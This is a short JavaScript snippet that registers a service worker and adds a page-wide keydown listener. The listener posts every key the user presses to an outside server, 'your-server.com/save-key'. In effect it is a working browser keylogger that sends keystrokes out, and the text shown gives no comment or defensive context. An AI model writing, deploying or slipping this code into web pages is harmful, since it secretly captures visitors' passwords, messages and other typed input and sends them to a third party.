navigator.serviceWorker.register("worker.js");

document.addEventListener("keydown", function(event) {
    fetch("https://your-server.com/save-key", {  
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ key: event.key })
    });
});
